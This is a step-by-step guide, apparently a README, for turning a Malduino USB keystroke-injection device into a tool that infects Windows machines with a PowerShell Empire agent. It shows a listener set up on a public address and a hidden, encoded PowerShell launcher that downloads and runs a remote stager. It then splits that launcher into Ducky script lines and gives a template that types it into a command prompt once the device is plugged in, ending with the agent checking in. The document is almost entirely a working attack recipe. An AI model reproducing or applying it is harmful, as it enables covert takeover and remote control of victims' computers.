# Building a Malduino Powershell Empire infecting tool.
**1 - Create a listener in Empire.**
```
====================================================================================
 Empire: PowerShell post-exploitation agent | [Version]: 1.6.0
====================================================================================
 [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
====================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       180 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > options

Listener Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        test                             Listener name.
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  StagingKey        True        *********EDITED***************** Staging key for initial agent negotiation.
  Type              True        native                           Listener type (native, pivot, hop, foreign, meter).
  RedirectTarget    False                                        Listener target to redirect to for pivot/hop.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Host              True        http://10.0.2.4:8080             Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultProfile    True        /admin/get.php,/news.asp,/login/ Default communication profile for the agent.
                                process.jsp|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Port              True        8080                             Port for the listener.

(Empire: listeners) > run
[*] Listener 'test' successfully started.
(Empire: listeners) > set Type foreign
(Empire: listeners) > set Host http://PUBLIC_IP_ADDRESS:8080
(Empire: listeners) > options

Listener Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        test1                            Listener name.
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  StagingKey        True        *********EDITED***************** Staging key for initial agent negotiation.
  Type              True        foreign                          Listener type (native, pivot, hop, foreign, meter).
  RedirectTarget    False                                        Listener target to redirect to for pivot/hop.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Host              True        http://PUBLIC_IP_ADDRESS:8080    Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultProfile    True        /admin/get.php,/news.asp,/login/ Default communication profile for the agent.
                                process.jsp|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Port              True        8080                             Port for the listener.



(Empire: listeners) > run
[*] Listener 'test1' successfully started.
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://10.0.2.4:8080                 native    5/0.0                      
  2     test1             http://PUBLIC_IP_ADDRESS:8080        foreign   5/0.0                      

(Empire: listeners) > launcher test1
powershell.exe -NoP -sta -NonI -W Hidden -Enc EditedForPrivacyPurposeAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAEQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAHgAeQAgAD0AIABbAFMAWQBTAHQAZQBAC4AByAFsAXQBdACQAYgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AEMALgBEAE8AdwBuAEwAbwBhAGQAUwB0AHIAaQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AOAAzAC4AMQA2ADUALgAxADQAMgAuADUANwA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiBTAFkAcACkAKQApAHwAJQB7ACQAXwAtAEIAWwuAE4ARQBUAC4AUwBFAHIAdgBpAGMAZQBQAG8ASQBuAHQATQBhAG4AQQBnAGUAUgBdADoAOgBFAFgAUABlAGMAVAAxADAAMABDAE8AbgBUAGkAbgBVAEUAIAA9ACEMALgBQAHIAbwBYAHkALgBDAFIARQBkAGUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAFkAUwB0AEUATQAuAE4ARQBUAC4AQwBSAGUAZABlAG4AdABJAEEAbABDAGEAYwBIAEUAXQA6ADoARABFAEYAQQB1WABvAFIAJABLAFsAJABJACsAKwAlACQASwAuAEwNARQBOAEcAVABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBKAG8AaQBuACcAJwApAAAAMAA7ACQAVwBDAD0ATgBFAHcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBtAC4ATgBFAFQALgBXAEUAYgBDAEwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdTgBFAHQALgBXAGUAQgBSAGUAcQB1AGUAUwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAG8AeAB5ADsAJABXAwB0AEUATQAAEwAVABOAGUAVABXAG8AUgBLAEMAUgBFAGQARQBOAHQASQBhAGwAUwA7ACQASwA9ACcAbAArAEAAPwB5AEsATwBMAC0AdwAvAG4APABtAGsAJQBJAGAATgBRADAAPQBQAC4AZABaADIAeABXAFYAMwAkACcAOwAkAGkAPQAwADsAWwBjAEgAQQwBzACAATgBUACAANgAuADEA==

```
**2 - Convert the launcher to STRING commands.** 

Malduino command buffer has a size of 256B so the payload must be fragmented. This can be done with the [converter](https://malduino.com/converter/).
```
STRING EditedForPrivacyPurposeAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAEQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAHgAeQAgAD0AIABbAFMAWQBTAHQAZ
STRING QBAC4AByAFsAXQBdACQAYgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AEMALgBEAE8AdwBuAEwAbwBhAGQAUwB0AHIAaQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AOAAzAC4AMQA2ADUALgAxADQAMgAuADUANwA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiBTAFkAcACkAKQApAHwAJQB7ACQAXwAtAEIAWwuAE4ARQBUAC4
STRING AUwBFAHIAdgBpAGMAZQBQAG8ASQBuAHQATQBhAG4AQQBnAGUAUgBdADoAOgBFAFgAUABlAGMAVAAxADAAMABDAE8AbgBUAGkAbgBVAEUAIAA9ACEMALgBQAHIAbwBYAHkALgBDAFIARQBkAGUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAFkAUwB0AEUATQAuAE4ARQBUAC4AQwBSAGUAZABlAG4AdABJAEEAbABDAGEAYwBIAEUAXQA6ADo
STRING ARABFAEYAQQB1WABvAFIAJABLAFsAJABJACsAKwAlACQASwAuAEwNARQBOAEcAVABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBKAG8AaQBuACcAJwApAAAAMAA7ACQAVwBDAD0ATgBFAHcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBtAC4ATgBFAFQALgBXAEUAYgBDAEwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQA
STRING vADUALgAwACAAKABXAGkAbgBkAG8AdTgBFAHQALgBXAGUAQgBSAGUAcQB1AGUAUwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAG8AeAB5ADsAJABXAwB0AEUATQAAEwAVABOAGUAVABXAG8AUgBLAEMAUgBFAGQARQBOAHQASQBhAGwAUwA7ACQASwA9ACcAbAArAEAAPwB5AEsATwBMAC0AdwAvAG4APABtAGsAJQBJAGAA
STRING TgBRADAAPQBQAC4AZABaADIAeABXAFYAMwAkACcAOwAkAGkAPQAwADsAWwBjAEgAQQwBzACAATgBUACAANgAuADEA
```
**3 - Build the Ducky script.**

Taking this template we just need to paste the payload and save it to the SD or upload to the Lite version.
```
DELAY 1000
GUI r
DELAY 200
STRING cmd.exe
ENTER
###PASTE PAYLOAD CONVERTED TO STRING HERE###
ENTER
```
For this example, the script looks like this:
```
DELAY 1000
GUI r
DELAY 200
STRING cmd.exe
ENTER
STRING EditedForPrivacyPurposeAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAEQARQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAHgAeQAgAD0AIABbAFMAWQBTAHQAZ
STRING QBAC4AByAFsAXQBdACQAYgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AEMALgBEAE8AdwBuAEwAbwBhAGQAUwB0AHIAaQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AOAAzAC4AMQA2ADUALgAxADQAMgAuADUANwA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiBTAFkAcACkAKQApAHwAJQB7ACQAXwAtAEIAWwuAE4ARQBUAC4
STRING AUwBFAHIAdgBpAGMAZQBQAG8ASQBuAHQATQBhAG4AQQBnAGUAUgBdADoAOgBFAFgAUABlAGMAVAAxADAAMABDAE8AbgBUAGkAbgBVAEUAIAA9ACEMALgBQAHIAbwBYAHkALgBDAFIARQBkAGUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAFkAUwB0AEUATQAuAE4ARQBUAC4AQwBSAGUAZABlAG4AdABJAEEAbABDAGEAYwBIAEUAXQA6ADo
STRING ARABFAEYAQQB1WABvAFIAJABLAFsAJABJACsAKwAlACQASwAuAEwNARQBOAEcAVABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBKAG8AaQBuACcAJwApAAAAMAA7ACQAVwBDAD0ATgBFAHcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBtAC4ATgBFAFQALgBXAEUAYgBDAEwASQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQA
STRING vADUALgAwACAAKABXAGkAbgBkAG8AdTgBFAHQALgBXAGUAQgBSAGUAcQB1AGUAUwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAG8AeAB5ADsAJABXAwB0AEUATQAAEwAVABOAGUAVABXAG8AUgBLAEMAUgBFAGQARQBOAHQASQBhAGwAUwA7ACQASwA9ACcAbAArAEAAPwB5AEsATwBMAC0AdwAvAG4APABtAGsAJQBJAGAA
ENTER
```
**4 - Plug in a computer to get the Empire agent connection.**

I'm plugging it in a local computer, but external connections should work fine if everything is NATed.

`(Empire) > [+] Initial agent BRYM4HWWLBXCSDFH from EDITED now active`


